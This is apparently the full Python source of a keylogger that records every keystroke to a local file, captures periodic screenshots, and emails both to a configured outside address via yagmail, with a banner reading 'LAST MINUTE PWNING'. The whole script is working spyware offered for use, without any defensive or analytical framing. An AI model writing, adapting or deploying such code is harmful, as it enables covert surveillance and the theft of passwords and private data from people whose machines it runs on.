import pynput
from pynput.keyboard import Key, Listener
import pyautogui
import yagmail
import os.path
from datetime import datetime
import time 
import sys
import os
from sys import platform as _platform


#Defining color values for later
G = '\033[32m' #Green
R = '\033[31m' # Red
C = '\033[36m' # Cyan
W = '\033[0m'  # White


#Needs testing but it SHOULD work
if _platform == "linux" or _platform =="linux2" or _platform =="darwin":
    os.system('clear')
elif _platform == "win32" or _platform == "win64":
        os.system('cls')

count = 0
keys = []


try: 
    print(G + "I am alive..." + W)
    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1
        print("{0} pressed".format(key))
        if count >= 10:
            count = 0
            write_file(keys)
            keys = []
            
                    
    #Special characters are included here.               
    def write_file(keys):
        with open("Log.txt", "a") as f: #Saves the Logging data
            for key in keys:
                k = str(key).replace("'","")

                if k.find("space") > 0:
                    f.write(str(' '))
                elif k.find("caps_lock") > 0:
                    f.write(str("<CAPS_LOCK>"))
                elif k.find("enter") > 0:
                    f.write(str("\n"))  
                elif k.find("<96>") > -1:
                    f.write(str("0"))
                elif k.find("<97>") > -1:
                    f.write(str("1"))  
                elif k.find("<98>") > -1:
                    f.write(str("2")) 
                elif k.find("<99>") > -1:
                    f.write(str("3"))      
                elif k.find("<100>") > -1:
                    f.write(str("4"))
                elif k.find("<101>") > -1:
                    f.write(str("5"))  
                elif k.find("<102>") > -1:
                    f.write(str("6"))
                elif k.find("<103>") > -1:
                    f.write(str("7")) 
                elif k.find("<104>") > -1:
                    f.write(str("8"))  
                elif k.find("<105>") > -1:
                    f.write(str("9"))   
                elif k.find("Key") == -1:
                    f.write(k)    
                    
                                                      
    def on_release(key):
        if key == Key.esc:
            return False
        
        
    def save_screenshot():     
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(r'Evidence.png') #Saves a Screenshot
        
        #Check if it works
    def send_email():
        receiver_emails = ['receiver-email@outlook.com'] #Enter the email which receives the keylog data.
        subject = "Keylog Data" + datetime.now().strftime("%d-%m-%Y %H-%M-%S")   
        yag=yagmail.SMTP("sender-email@gmail.com","throwaway123") #Enter the credentials used by the account that will send you the email.


        #This is the body of the email that will be sent to you
        contents = [
        '  <b> <font color="#FF1493" size="10">   LAST MINUTE PWNING 👾   </font>  </b>',
            "Log.txt", 
            "Evidence.png"
        ]

        yag.send(receiver_emails, subject, contents)
    

    with Listener(on_press=on_press, on_release=on_release) as listener:
        
        #Call Methods, Repeats every 1 minute
        while True:
            time.sleep(100)
            save_screenshot() 
            send_email()  
        listener.join()
           
           
except KeyboardInterrupt:
    print('\n' + R + "Program Killed X_X" + W)
    

